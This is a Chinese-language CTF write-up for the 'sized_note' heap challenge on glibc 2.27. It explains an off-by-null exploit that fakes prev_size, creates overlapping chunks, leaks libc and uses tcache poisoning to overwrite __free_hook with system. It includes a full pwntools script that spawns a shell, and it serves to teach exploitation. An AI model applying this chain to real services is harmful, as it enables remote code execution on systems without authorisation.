# sized_note

## 题目简述

题目使用 glibc 2.27，note 编辑存在 off-by-null。利用目标是伪造相邻 chunk 的 `prev_size`，用结尾的空字节清除 `PREV_INUSE`，在释放时触发向后合并并制造重叠 chunk；随后泄露 libc，再通过 tcache poisoning 覆盖 `__free_hook`。

## 解题过程

先申请 11 个请求大小为 `0xF8` 的 chunk。释放索引 3 到 9，恰好用 7 个 chunk 填满对应 tcache。索引 0、1、2 保持相邻。

释放索引 0 后，在索引 1 的末尾写入伪造的 `prev_size = 0x200`。输入函数额外写入的结尾空字节会把索引 2 的 size 低字节清零，同时清掉 `PREV_INUSE`。释放索引 2 时，分配器会认为前方存在一个跨度为 `0x200` 的空闲 chunk，于是把索引 0 到 2 向后合并，产生覆盖仍在使用的索引 1 的大块。

从重叠区申请两个 `0x78` chunk 后，原索引 1 的内容与 unsorted bin 元数据重叠。显示索引 1 可以泄露 main arena 指针，按题目所用 libc 的偏移计算基址：

```text
libc_base = leak - __malloc_hook - 0x10 - 0x60
```

最后利用重叠写修改 `0x60` 大小 tcache 条目的 `next` 指针为 `__free_hook`。连续两次申请后，第二次返回 `__free_hook`，写入 `system`；释放保存 `/bin/sh` 的 chunk 即可得到 shell。

完整脚本如下；复现时需替换失效的服务地址与端口。

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

HOST = "example.invalid"
PORT = 0

context.log_level = "debug"
libc = ELF("./libc-2.27.so", checksec=False)
io = remote(HOST, PORT)

io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

def add(index, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(index).encode())
    io.sendlineafter(b">> ", str(size).encode())
    io.sendafter(b">> ", content)

def show(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(index).encode())

def delete(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(index).encode())

def edit(index, payload):
    io.sendlineafter(b">> ", b"4")
    io.sendafter(b">> ", str(index).encode().ljust(8, b"\x00"))
    io.send(payload)

for index in range(11):
    add(index, 0xF8, b"A" * 0xF7)

add(12, 0x60, b"\n")

# 填满 0x100 大小类的 tcache。
for index in range(3, 10):
    delete(index)

delete(0)

# prev_size = 0x200，结尾 NUL 清除下一个 chunk 的 PREV_INUSE。
edit(1, b"A" * 0xF0 + p64(0x200))
delete(2)

# 从合并后的大块切出重叠 chunk，并泄露 main arena。
add(0, 0x78, b"\n")
add(0, 0x78, b"\n")
show(1)
leak = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = leak - libc.sym["__malloc_hook"] - 0x10 - 0x60
log.success("libc base: %#x", libc.address)

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

# 借重叠区污染 0x70 tcache 单链表。
add(0, 0x60, b"\n")
delete(12)
delete(0)
edit(1, p64(free_hook))

add(1, 0x60, b"/bin/sh\x00")
add(2, 0x60, p64(system))
delete(1)
io.interactive()
```

## 方法总结

这条利用链先用 off-by-null 伪造向后合并条件，再把重叠 chunk 转化为 libc 泄露和 tcache 指针篡改。关键细节是先填满相应 tcache，否则释放行为可能被 tcache 提前截获，无法进入预期的合并路径。最终选择 `__free_hook = system`，可以直接复用释放操作传入 `/bin/sh`。
